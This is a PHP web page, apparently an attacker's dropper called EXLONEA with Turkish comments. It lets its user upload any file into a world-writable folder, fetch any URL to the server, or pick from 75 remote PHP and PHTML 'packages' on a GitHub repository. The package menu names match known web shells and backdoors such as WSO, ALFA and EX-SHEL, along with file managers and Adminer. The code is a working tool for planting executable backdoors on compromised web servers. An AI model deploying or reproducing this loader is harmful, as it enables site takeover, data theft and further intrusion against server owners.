<?php
$uploadDir = 'exlonea/';
$successMessage = "";
$uploadedFileLink = ""; // En son yüklenen dosyanın linkini tutacak değişken


// Dosya yükleme işlemi
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }
    $targetFile = $uploadDir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
        $successMessage = "<div class='alert success'>Dosya başarıyla yüklendi: <a href='$targetFile' target='_blank'>$targetFile</a></div>";
    } else {
        $successMessage = "<div class='alert error'>Dosya yüklenirken bir hata oluştu.</div>";
    }
}

// Link ile dosya indirme ve kaydetme işlemi
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['file_link'])) {
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }
    $fileLink = $_POST['file_link'];
    $fileName = basename(parse_url($fileLink, PHP_URL_PATH));
    $targetFile = $uploadDir . $fileName;

    $fileContent = file_get_contents($fileLink);
    if ($fileContent !== false && file_put_contents($targetFile, $fileContent)) {
        $successMessage = "<div class='alert success'>Dosya başarıyla indirildi ve kaydedildi: <a href='$targetFile' target='_blank'>$targetFile</a></div>";
    } else {
        $successMessage = "<div class='alert error'>Dosya indirilemedi veya kaydedilemedi.</div>";
    }
}

// Hazır paket indirme işlemi
if (isset($_GET['package'])) {
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    // Paketlerin bağlantıları ve dosya isimleri
    $packages = [
        1 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/1.php", "1.php"],
        2 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/2.php", "2.php"],
        3 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/3.php", "3.php"],
        4 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/4.php", "4.php"],
        5 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/5.php", "5.php"],
        6 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/6.php", "6.php"],
        7 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/7.php", "7.php"],
        8 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/8.php", "8.php"],
        9 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/9.php", "9.php"],
        10 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/10.php", "10.php"],
        11 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/11.php", "11.php"],
        12 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/12.php", "12.php"],
        13 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/13.php", "13.php"],
        14 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/14.php", "14.php"],
        15 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/15.php", "15.php"],
        16 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/16.php", "16.php"],
        17 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/17.phtml", "17.phtml"],
        18 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/18.php", "18.php"],
        19 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/19.php", "19.php"],
        20 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/20.php", "20.php"],
        21 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/21.phtml", "21.phtml"],
        22 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/22.php", "22.php"],
        23 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/23.php", "23.php"],
        24 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/24.php", "24.php"],
        25 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/25.php", "25.php"],
        26 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/26.php", "26.php"],
        27 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/27.php", "27.php"],
        28 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/28.php", "28.php"],
        29 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/29.php", "29.php"],
        30 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/30.php", "30.php"],
        31 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/31.php", "31.php"],
        32 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/32.php", "32.php"],
        33 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/33.php", "33.php"],
        34 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/34.php", "34.php"],
        35 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/35.php", "35.php"],
        36 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/36.php", "36.php"],
        37 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/37.php", "37.php"],
        38 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/38.php", "38.php"],
        39 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/39.php", "39.php"],
        40 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/40.php", "40.php"],
        41 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/41.php", "41.php"],
		42 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/42.php", "42.php"],
        43 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/43.php", "43.php"],
		44 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/44.php", "44.php"],
		45 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/45.php", "45.php"],
		46 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/46.php", "46.php"],
		47 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/47.php", "47.php"],
		48 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/48.php", "48.php"],
		49 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/49.php", "49.php"],
		50 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/50.php", "50.php"],
		51 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/51.php", "51.php"],
		52 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/52.php", "52.php"],
		53 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/53.php", "53.php"],
		54 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/54.php", "54.php"],
		55 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/55.php", "55.php"],
		56 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/56.php", "56.php"],
		57 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/57.php", "57.php"],
		58 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/58.php", "58.php"],
		59 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/59.php", "59.php"],
		60 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/60.php", "60.php"],
		61 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/61.php", "61.php"],
		62 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/62.php", "62.php"],
		63 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/63.php", "63.php"],
		64 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/64.php", "64.php"],
		65 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/65.php", "65.php"],
		66 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/66.php", "66.php"],
		67 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/67.php", "67.php"],
		68 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/68.php", "68.php"],
		69 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/69.php", "69.php"],
		70 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/70.php", "70.php"],
		71 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/71.php", "71.php"],
		72 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/72.php", "72.php"],
		73 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/73.php", "73.php"],
		74 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/74.php", "74.php"],
		75 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/75.php", "75.php"],
		
        // İlerleyen zamanlarda başka paketler eklemek için buraya yeni elemanlar ekleyebilirsiniz.
    ];

    $packageNumber = intval($_GET['package']);

    // Eğer geçerli paket varsa, ilgili dosyayı indir ve kaydet
    if (isset($packages[$packageNumber])) {
        $packageLink = $packages[$packageNumber][0];
        $fileName = $packages[$packageNumber][1];
        $targetFile = $uploadDir . $fileName;

        $fileContent = file_get_contents($packageLink);
        if ($fileContent !== false && file_put_contents($targetFile, $fileContent)) {
            $successMessage = "<div class='alert success'>Dosya başarıyla indirildi ve kaydedildi: <a href='$targetFile' target='_blank'>$targetFile</a></div>";
        } else {
            $successMessage = "<div class='alert error'>Dosya indirilemedi veya kaydedilemedi.</div>";
        }
    } else {
        $successMessage = "<div class='alert error'>Geçersiz paket numarası.</div>";
    }
}

$currentFile = basename($_SERVER['PHP_SELF']);
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EXLONEA - Dosya Yükleme</title>
    <link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@400&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff; /* Arka plan rengini beyaz yap */
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            padding: 0 15px;
            box-sizing: border-box;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            text-align: center;
            margin: 10px 0;
            box-sizing: border-box;
            border: 3px solid #000000; /* Çerçeve rengini butonlarla aynı yap */
        }
        .header {
            background-color: #000000;
            padding: 15px;
            border-radius: 10px 10px 0 0;
            margin: -20px -20px 20px -20px;
        }
        .header h1 {
            font-family: 'Cinzel Decorative', serif;
            font-size: 40px;
            color: white;
            letter-spacing: 2px;
            font-weight: 400; /* İnce yazı stili için bu kısmı değiştirdim */
        }
        .header h1 span {
            color: #ffffff;
        }
        .header a {
            text-decoration: none;
            color: white;
        }
        input, button {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            background-color: #000000;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #222222;
        }
        .alert {
            padding: 10px;
            margin-top: 15px;
            border-radius: 5px;
        }
        .alert.success {
            background-color: #d4edda;
            color: #155724;
        }
        .alert.error {
            background-color: #f8d7da;
            color: #721c24;
        }
        .dropdown {
            background-color: #000000;
            color: white;
            padding: 12px;
            margin-top: 10px;
            border-radius: 5px;
            cursor: pointer;
            text-align: center;
            user-select: none;
        }
        .dropdown:hover {
            background-color: #222222;
        }
        .dropdown-menu {
            display: none;
            background: white;
            border: 1px solid #ccc;
            border-radius: 5px;
            max-height: 200px;
            overflow-y: auto;
        }
        .dropdown-menu a {
            display: block;
            padding: 10px;
            text-decoration: none;
            color: black;
        }
        .dropdown-menu a:hover {
            background-color: #d4edda;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <a href="<?php echo $currentFile; ?>"><h1>e<span>X</span>lONeA</h1></a>
        </div>

        <form action="" method="POST" enctype="multipart/form-data">
            <div class="dropdown" onclick="document.getElementById('fileInput').click();">Dosya Seç</div>
            <input type="file" id="fileInput" name="file" style="display: none;" required onchange="updateFileName()">
            <span id="fileName" style="display: block; margin-top: 10px; font-weight: bold;"></span> <!-- Seçilen dosya adını gösterecek alan -->
            <button type="submit">Yükle</button>
        </form>

        <form action="" method="POST">
            <input type="url" name="file_link" placeholder="Dosya linkini girin" required>
            <button type="submit">Ekle</button>
        </form>

        <div class="dropdown" onclick="toggleMenu()">Hazır Paketler</div>
        <div class="dropdown-menu" id="packageMenu">
            <a href="?package=1">EX-ALFA-1</a>
			<a href="?package=2">EX-ALFA-2</a>
			<a href="?package=3">EX-ALFA-3</a>
			<a href="?package=4">EX-ALFA-4</a>
			<a href="?package=5">EX-ALFA-5</a>
			<a href="?package=6">EX-ALFA-6</a>
			<a href="?package=7">ALFA-1</a>
            <a href="?package=8">ALFA-2</a>
            <a href="?package=9">ALFA-3</a>
            <a href="?package=10">ALFA-4</a>
            <a href="?package=11">ALFA-5</a>
            <a href="?package=12">ALFA-6</a>
            <a href="?package=13">ALFA-7</a>
            <a href="?package=14">ALFA-8</a>
            <a href="?package=15">ALFA-9</a>
            <a href="?package=16">ALFA-10</a>
            <a href="?package=17">ALFA-11</a>
            <a href="?package=18">ALFA-12</a>
            <a href="?package=19">ALFA-13</a>
            <a href="?package=20">ALFA-14</a>
            <a href="?package=21">ALFA-15</a>
            <a href="?package=22">ALFA-16</a>
            <a href="?package=23">ALFA-17</a>
            <a href="?package=24">ALFA-18</a>
			<a href="?package=25">ALFA-19</a>
			<a href="?package=26">EX-PAS-1</a>
			<a href="?package=27">EX-PAS-2</a>
			<a href="?package=28">EX-PAS-3</a>
			<a href="?package=29">EX-PAS-4</a>
			<a href="?package=30">EX-PAS-5</a>
			<a href="?package=31">EX-PAS-7</a>
			<a href="?package=32">EX-PAS-8</a>
			<a href="?package=33">EX-PAS-9</a>
			<a href="?package=34">EX-PAS-10</a>
			<a href="?package=35">EX-PAS-11</a>
			<a href="?package=36">EX-PAS-12</a>
			<a href="?package=37">EX-PAS-13</a>
			<a href="?package=38">EX-PAS-14</a>
			<a href="?package=39">EX-PAS-15</a>
			<a href="?package=40">EX-PAS-16</a>
			<a href="?package=41">EX-PAS-17</a>
			<a href="?package=42">EX-PAS-18</a>
			<a href="?package=43">EX-PAS-19</a>
			<a href="?package=44">EX-FILEMANAGER-1</a>
			<a href="?package=45">EX-FILEMANAGER-2</a>
			<a href="?package=46">EX-FILEMANAGER-3</a>
			<a href="?package=47">EX-FILEMANAGER-4</a>
			<a href="?package=48">EX-FILEMANAGER-5</a>
			<a href="?package=49">EX-SHEL-1</a>
			<a href="?package=50">EX-SHEL-2</a>
			<a href="?package=51">EX-SHEL-3</a>
			<a href="?package=52">EX-SHEL-4</a>
			<a href="?package=53">EX-SHEL-5</a>
			<a href="?package=54">EX-SHEL-6</a>
			<a href="?package=55">EX-BLACK-1</a>
			<a href="?package=56">EX-BLACK-2</a>
			<a href="?package=57">EX-BLACK-3</a>
			<a href="?package=58">EX-BLACK-4</a>
			<a href="?package=59">EX-BLACK-5</a>
			<a href="?package=60">EX-BLACK-6</a>
			<a href="?package=61">EX-WSO-1</a>
			<a href="?package=62">EX-WSO-2</a>
			<a href="?package=63">EX-WSO-3</a>
			<a href="?package=64">EX-WSO-4</a>
			<a href="?package=65">EX-WSO-5</a>
			<a href="?package=66">EX-WSO-6</a>
			<a href="?package=67">EX-K2LL33D-1</a>
			<a href="?package=68">EX-K2LL33D-2</a>
			<a href="?package=69">EX-K2LL33D-3</a>
			<a href="?package=70">EX-K2LL33D-4</a>
			<a href="?package=71">EX-K2LL33D-5</a>
			<a href="?package=72">EX-K2LL33D-6</a>
			<a href="?package=73">FILEMANAGER</a>
			<a href="?package=74">ADMINER</a>
			<a href="?package=75">DELETE</a>
		
            
            
        </div>

        <?php if ($successMessage) echo $successMessage; ?>
    </div>
    <div class="footer" style="color:#a2a2a2;">Copyright © Exlonea - 2025</div>

    <script>
        function toggleMenu() {
            var menu = document.getElementById("packageMenu");
            menu.style.display = (menu.style.display === "block" ? "none" : "block");
        }

        // Dosya adı güncelleme fonksiyonu
        function updateFileName() {
            var fileInput = document.getElementById('fileInput');
            var fileName = document.getElementById('fileName');
            fileName.textContent = fileInput.files[0] ? fileInput.files[0].name : ''; // Seçilen dosyanın adını göster
        }
    </script>
</body>
</html>